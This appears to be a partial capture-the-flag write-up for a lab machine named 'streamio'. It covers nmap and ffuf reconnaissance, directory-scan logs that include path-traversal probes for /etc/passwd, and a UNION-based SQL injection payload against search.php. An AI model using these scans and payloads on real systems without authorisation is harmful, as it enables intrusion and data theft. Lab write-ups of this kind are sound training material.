# streamio

## Nmap

```console
Open 10.129.125.98:53
Open 10.129.125.98:80
Open 10.129.125.98:88
Open 10.129.125.98:135
Open 10.129.125.98:139
Open 10.129.125.98:389
Open 10.129.125.98:443
Open 10.129.125.98:445
Open 10.129.125.98:464
Open 10.129.125.98:593
Open 10.129.125.98:636
Open 10.129.125.98:3269
Open 10.129.125.98:3268
Open 10.129.125.98:5985
Open 10.129.125.98:9389


PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open     http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open     kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-22 23:08:17Z)
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
443/tcp   open     ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2024-10-22T23:09:07+00:00; +7h01m06s from scanner time.
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
445/tcp   open     microsoft-ds? syn-ack ttl 127
593/tcp   open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped    syn-ack ttl 127
3387/tcp  filtered backroomnet   no-response
3389/tcp  filtered ms-wbt-server no-response
5504/tcp  filtered fcp-cics-gw1  no-response
5985/tcp  open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        syn-ack ttl 127 .NET Message Framing
49677/tcp open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
50665/tcp filtered unknown       no-response
50666/tcp filtered unknown       no-response
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

## Web

* Dirbusting streamIO.htb

```text
301 -  147B  - /js  ->  https://streamio.htb/js/                 
403 -  312B  - /%2e%2e//google.com                               
403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
200 -    8KB - /about.php                                        
301 -  150B  - /ADMIN  ->  https://streamio.htb/ADMIN/           
301 -  150B  - /Admin  ->  https://streamio.htb/Admin/           
301 -  150B  - /admin  ->  https://streamio.htb/admin/           
403 -   18B  - /admin/                                           
403 -   18B  - /Admin/                                           
403 -   18B  - /admin/index.php                                  
403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
200 -    6KB - /contact.php                                      
301 -  148B  - /css  ->  https://streamio.htb/css/               
400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
200 -    1KB - /favicon.ico                                      
301 -  150B  - /fonts  ->  https://streamio.htb/fonts/           
301 -  151B  - /images  ->  https://streamio.htb/images/         
403 -    1KB - /images/
403 -    1KB - /js/                                              
200 -    4KB - /login.php                                        
302 -    0B  - /logout.php  ->  https://streamio.htb/            
200 -    4KB - /register.php                                     
403 -    2KB - /Trace.axd
```

* recursive fuzzing the admin dir

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt  -recursion -u https://streamIO.htb/admin/FUZZ
```

```text

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamIO.htb/admin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 832ms]
.                       [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 167ms]
Index.php               [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 165ms]
master.php              [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 477ms]
index.Php               [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 165ms]
```

* dirbusting watch.streamIO.htb

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt  -recursion -u https://watch.streamIO.htb/FUZZ
```

``` text
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://watch.streamIO.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 206ms]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 169ms]
.                       [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 168ms]
blocked.php             [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 164ms]
search.php              [Status: 200, Size: 253887, Words: 1, Lines: 1, Duration: 892ms]
Search.php              [Status: 200, Size: 253887, Words: 1, Lines: 1, Duration: 501ms]
Index.php               [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 954ms]
Favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 165ms]
favicon.ICO             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 165ms]
index.Php               [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 166ms]
```

## SQL Injection on search.php

```text
abcd' union select 1,2,3,4,5,6--
#returns only  columns 2 and 3

```
